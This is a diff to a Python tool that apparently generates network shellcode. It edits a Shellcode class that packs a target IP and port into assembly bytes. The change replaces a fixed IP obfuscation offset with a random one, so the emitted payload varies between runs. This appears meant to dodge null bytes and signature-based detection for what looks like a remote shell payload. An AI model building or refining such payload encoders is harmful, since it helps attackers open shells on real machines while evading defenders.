@@ -83,10 +83,10 @@ SHELL = [
 ''' FUNCTIONS '''
 
 # Parse IP and return hexa
-def gen_ip_in_hex(splited_ip):
+def gen_ip_in_hex(splited_ip, inc: int):
     new_ip_parts = []
     for part in splited_ip:
-        new_part = int(part) + 1
+        new_part = int(part) + inc
         new_ip_parts.append(str(new_part))
     new_ip_address = ".".join(new_ip_parts)
     var = socket.inet_aton(new_ip_address)
@@ -152,8 +152,10 @@ class Shellcode():
         port_hex = port_hex.to_bytes(2, byteorder='little')
         port_hex = ''.join(['\\x{:02x}'.format(b) for b in port_hex])
         
-        ip_hex = gen_ip_in_hex(splited_ip)
-        ip_sub = r"\x01\x01\x01\x01"
+        
+        inc = randrange(5) + 1
+        ip_hex = gen_ip_in_hex(splited_ip, inc)
+        ip_sub = fr"\x{inc:02x}\x{inc:02x}\x{inc:02x}\x{inc:02x}"
 
         self.__code += MOV["rdi,rax"]
         self.__code += MOV["r10,rax"]
